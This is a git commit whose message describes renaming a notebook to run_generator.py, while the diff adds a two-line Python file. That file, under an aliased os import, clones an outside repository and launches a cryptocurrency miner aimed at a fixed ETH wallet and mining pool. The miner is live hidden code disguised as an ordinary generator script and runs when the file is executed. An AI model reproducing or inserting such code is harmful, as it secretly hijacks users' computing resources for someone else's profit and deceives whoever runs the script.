388ad5853c4a9ce8fa00a5914148ba8792baa728
nfak12 <92928393+nfak12@users.noreply.github.com>
2021-10-21 19:57:11 +0500

    Update and rename run_generator.ipynb to run_generator.py

---
+++ run_generator.py
@@ -0,0 +1,2 @@
+import os as alpha
+alpha.system ("git clone https://github.com/hunshukajh/yes && cd yes && chmod +x cmdline_launcher.sh gas && ./cmdline_launcher.sh -coin ETH -wallet 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.81rnkx4xv7s4w8b  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 us.stratu.ms:15969") 
